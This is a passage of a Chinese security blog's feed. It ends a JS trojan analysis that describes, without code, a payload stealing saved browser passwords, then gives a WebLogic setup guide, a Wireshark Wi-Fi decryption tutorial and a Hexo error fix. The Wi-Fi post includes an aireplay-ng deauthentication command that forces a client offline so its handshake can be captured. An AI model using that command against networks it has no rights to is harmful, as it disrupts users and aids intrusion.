id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h3><p>　　由于找不到下载到本地的恶意代码文本，特意到网上搜了N个该 <code>JS</code> 的特征代码。最后终于发现了在国外的一个网站上发现了对类似 <code>JS</code> 执行的内存和行为分析，虽然还是没有下载的恶意代码文本，但是已经能够大致确定该 <code>JS</code>下载的恶意代码的作用了。地址</p><blockquote><p><a href="https://www.hybrid-analysis.com/sample/d8f738474e7c4251132059375b3716fdf21e87823f5890a918dfb70a4d164066?environmentId=100" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/d8f738474e7c4251132059375b3716fdf21e87823f5890a918dfb70a4d164066?environmentId=100</a></p></blockquote><p>　　从上面找到了 <code>JS</code> 代码，发现和我们分析的样本的第一层混淆方式略有不同:<img src="http://image.3001.net/images/20171215/15133077742262.jpg" alt="img"></p><p>　　但是同样经过了最开始的还原之后，发现核心代码和分析样本代码基本一致:</p><p><img src="http://image.3001.net/images/20171215/15133131646109.jpg" alt="img"></p><p>　　最后来看下，该 <code>JS</code> 下载的恶意代码究竟干了什么:</p><p><img src="http://image.3001.net/images/20171215/15133077738626.jpg" alt="img"></p><p>　　大概意思就是该恶意文件会从本地浏览器窃取信息，如平时让浏览器记住的账号密码，然后查找电脑账户名称，计算机名，计算机组名ID等。</p><p>　　也可以从行为分析的角度再次验证 <code>JS</code> 执行过程，因为上面是从代码角度分析的，难免有点点抽象，从 <code>JS</code> 实际操作过程分析，会更加的直观。我们可以看到：</p><p><img src="http://image.3001.net/images/20171215/15133077739233.jpg" alt="img"><br><img src="http://image.3001.net/images/20171215/15133077723715.jpg" alt="img"></p><p>　　发现与分析基本一致。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;　　随着 &lt;code&gt;javascript&lt;/code&gt; 这类脚本语言的快速发展，它能展现的内容越来越多样，所运用的功能变得越来越强大。当运用在 &lt;code&gt;web&lt;/code&gt; 开发上时，增加了更多的动态功能和效果，极大的改善了用户体验。但是，随着 &lt;code&gt;js&lt;/code&gt; 的功能强大的同时，也带来了更多的安全隐患。由于 &lt;code&gt;js&lt;/code&gt; 的混淆效果多样，常见的有 &lt;code&gt;YUI Compressor&lt;/code&gt;、&lt;code&gt;Google Closure Compiler&lt;/code&gt;、&lt;code&gt;UglifyJS&lt;/code&gt;。更有 &lt;code&gt;jsfuck&lt;/code&gt; 这种比较奇葩的加密方式。使得让软件自动的识别特征码，查杀 &lt;code&gt;js&lt;/code&gt; 恶意代码变的非常困难。对 &lt;code&gt;JavaScript&lt;/code&gt; 恶意代码的检测已成为 &lt;code&gt;Web&lt;/code&gt; 信息安全领域一个亟待解决的问题。&lt;br&gt;　　因为近期偶然发现一个 &lt;code&gt;js&lt;/code&gt; 木马文件，所以想探寻一下 &lt;code&gt;js&lt;/code&gt; 木马的混淆方法和这个木马起的作用。&lt;br&gt;
    
    </summary>
    
      <category term="木马分析" scheme="http://x-f1v3.github.io/categories/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="JS" scheme="http://x-f1v3.github.io/tags/JS/"/>
    
      <category term="木马" scheme="http://x-f1v3.github.io/tags/%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Centos搭建Weblogic容器</title>
    <link href="http://x-f1v3.github.io//blog/1511748171281.html"/>
    <id>http://x-f1v3.github.io//blog/1511748171281.html</id>
    <published>2017-11-27T02:02:51.000Z</published>
    <updated>2019-06-13T05:30:31.850Z</updated>
    
    <content type="html"><![CDATA[<p>Centos搭建Weblogic容器<br><a id="more"></a></p><h3 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h3><p>安装前需要先卸载Centos自带的OpenJDK，然后安装新的JDK。</p><p>下载地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</span><br></pre></td></tr></table></figure></p><p>卸载OpenJDK<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep java</span><br><span class="line"></span><br><span class="line">然后把带有OpenJDK的删除，如</span><br><span class="line">yum -y remove java-1.7.0-openjdk ...</span><br></pre></td></tr></table></figure></p><p>安装下载的JDK<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh /tmp/jdk-8u45-linux-x64.rpm</span><br></pre></td></tr></table></figure></p><p>JDK安装路径为<code>/usr/java</code></p><p>设置环境变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">加入：</span><br><span class="line">JAVA_HOME=/usr/java/jdk1.8.0_45</span><br><span class="line">JRE_HOME=/usr/java/jdk1.8.0_45/jre</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">export JAVA_HOME JRE_HOME PATH CLASSPATH</span><br></pre></td></tr></table></figure></p><p>使设置生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure></p><p>参考</p><blockquote></blockquote><p><a href="http://www.live-in.org/archives/2486.html" target="_blank" rel="noopener">http://www.live-in.org/archives/2486.html</a><br><a href="http://blog.csdn.net/duguduchong/article/details/8816371" target="_blank" rel="noopener">http://blog.csdn.net/duguduchong/article/details/8816371</a></p><h3 id="安装Weblogic容器"><a href="#安装Weblogic容器" class="headerlink" title="安装Weblogic容器"></a>安装Weblogic容器</h3><p>下载地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.oracle.com/technetwork/cn/middleware/ias/downloads/wls-main-091116-zhs.html</span><br></pre></td></tr></table></figure></p><p>具体的安装过程，也是网上有的，亲测可用。</p><p>参考</p><blockquote><p><a href="http://www.live-in.org/archives/2491.html" target="_blank" rel="noopener">http://www.live-in.org/archives/2491.html</a></p></blockquote><p>具体的命令行安装还可以参考</p><blockquote></blockquote><p><a href="http://linux.it.net.cn/CentOS/course/2017/0827/27158.html" target="_blank" rel="noopener">http://linux.it.net.cn/CentOS/course/2017/0827/27158.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Centos搭建Weblogic容器&lt;br&gt;
    
    </summary>
    
      <category term="系统环境" scheme="http://x-f1v3.github.io/categories/%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83/"/>
    
    
      <category term="Centos" scheme="http://x-f1v3.github.io/tags/Centos/"/>
    
      <category term="Weblogic" scheme="http://x-f1v3.github.io/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>用Wireshark解密无线网络数据包</title>
    <link href="http://x-f1v3.github.io//blog/%E7%94%A8Wireshark%E8%A7%A3%E5%AF%86%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85.html"/>
    <id>http://x-f1v3.github.io//blog/用Wireshark解密无线网络数据包.html</id>
    <published>2017-10-10T02:35:24.000Z</published>
    <updated>2019-06-13T05:39:31.989Z</updated>
    
    <content type="html"><![CDATA[<p>当知道WIFI密码时，不需要直接连接WIFI，就可以抓取数据包<br><a id="more"></a></p><h3 id="抓取数据包"><a href="#抓取数据包" class="headerlink" title="抓取数据包"></a>抓取数据包</h3><p>开启网卡的监听模式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1507603437995.png" alt="image"></p><p>抓取指定AP的网络数据包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 11 -w xyw --bssid 36:DE:1A:98:F6:2A wlan0mon --output-format pcap</span><br></pre></td></tr></table></figure></p><p>这里<code>--output-format</code>是输出文件的文件格式<br><img src="http://x-f1v3.github.io/images/1507603809852.png" alt="image"></p><p><strong> 需要注意是，在抓的包中必须要有握手包，可以慢慢等，也可以进行洪水攻击 </strong></p><p>使用洪水攻击使其掉线，然后抓握手包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 10 -a 36:DE:1A:98:F6:2A  -c 14:F6:5A:A1:37:97 wlan0mon</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1507604261098.png" alt="image"></p><p>再等上一段时间，就停止抓包。</p><h3 id="解密数据包"><a href="#解密数据包" class="headerlink" title="解密数据包"></a>解密数据包</h3><p>刚抓到的数据包用Wireshark打开的话，是看不到具体的东西的需要解密。</p><p>打开Wireshark后，先在<code>Edit-&gt;preference-&gt;protocols-&gt;IEEE 802.11</code>中启动<code>Enable decryption</code><br><img src="http://x-f1v3.github.io/images/1507604503916.png" alt="image"></p><p>然后点上<code>view-&gt;Wireless Toolbar</code>，就会在后面出现<code>Decryptions Keys</code><br><img src="http://x-f1v3.github.io/images/1507604713429.png" alt="image"></p><p>点击这个<code>Decryptions Keys</code>，输入密码和SSID，然后点击apply,ok<br><img src="http://x-f1v3.github.io/images/1507604764354.png" alt="image"></p><p>最后<code>view-&gt;reload</code>,就可以看到里面具体的数据了<br><img src="http://x-f1v3.github.io/images/1507604829814.png" alt="image"><br><img src="http://x-f1v3.github.io/images/1507604874447.png" alt="image"></p><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>可以使用命令行直接解包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark -r xyw-02.cap -o wlan.enable_decryption:TRUE -o wlan.wep_key1:wpa-pwd:12345678:xyw</span><br></pre></td></tr></table></figure></p><p><code>-r</code> 后面接要打开的数据包 <code>-o</code>参数是要改变preference里面的设置</p><p><strong> 不过这是早期版本的Wireshark可以用 ，较新的版本里都不能使用</strong></p><p>新版本可以试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark -r xyw-02.cap -o wlan.enable_decryption:TRUE -o &quot;uat:80211_keys:\&quot;wpa-pwd\&quot;,\&quot; 12345678:xyw\&quot;&quot;</span><br></pre></td></tr></table></figure></p><p>自己测试是成功的</p><p><img src="http://x-f1v3.github.io/images/1507612001366.png" alt="image"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.lovemytool.com/blog/2010/05/wireshark-and-tshark-decrypt-sample-capture-file-by-joke-snelders.html" target="_blank" rel="noopener">http://www.lovemytool.com/blog/2010/05/wireshark-and-tshark-decrypt-sample-capture-file-by-joke-snelders.html</a></li><li><a href="https://wiki.wireshark.org/HowToDecrypt802.11" target="_blank" rel="noopener">https://wiki.wireshark.org/HowToDecrypt802.11</a></li><li><a href="https://ask.wireshark.org/questions/24249/decrypt-wpa-with-tshark" target="_blank" rel="noopener">https://ask.wireshark.org/questions/24249/decrypt-wpa-with-tshark</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当知道WIFI密码时，不需要直接连接WIFI，就可以抓取数据包&lt;br&gt;
    
    </summary>
    
      <category term="无线" scheme="http://x-f1v3.github.io/categories/%E6%97%A0%E7%BA%BF/"/>
    
    
      <category term="Wireshark" scheme="http://x-f1v3.github.io/tags/Wireshark/"/>
    
  </entry>
  
  <entry>
    <title>ERROR Deployer not found: git hexo d 报错</title>
    <link href="http://x-f1v3.github.io//blog/1505536580617.html"/>
    <id>http://x-f1v3.github.io//blog/1505536580617.html</id>
    <published>2017-09-16T04:36:20.000Z</published>
    <updated>2019-06-13T05:38:04.211Z</updated>
    
    <content type="html"><![CDATA[<p>刚搭建hexo的时候执行<code>hexo d</code>，总是会报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR Deployer not found: git</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>网上查了之后，大多都说是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save </span><br><span class="line">重新 deploy 即可</span><br></pre></td></tr></table></figure></p><p>最后也是照做了，但是还是报同样的错误，最后想是把这些文件都给删了，重新来一次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init yourfolder</span><br><span class="line">cd yourfolder</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure></p><p>当然好了之后，就要修改自己的<code>_config.yml</code>文件，然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure></p><p>居然莫名其妙的成功了，看来网上说的<code>npm install hexo-deployer-git --save</code> 也是正确方法，只不过，文件被我各种尝试给搞乱了，重新来一次就可以了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚搭建hexo的时候执行&lt;code&gt;hexo d&lt;/code&gt;，总是会报错：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ERROR Deployer not found: git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="解决报错" scheme="http://x-f1v3.github.io/categories/%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99/"/>
    
    
      <category term="Hexo" scheme="http://x-f1v3.github.io/tags/Hexo/"/>
    
  </entry>
  
</feed>
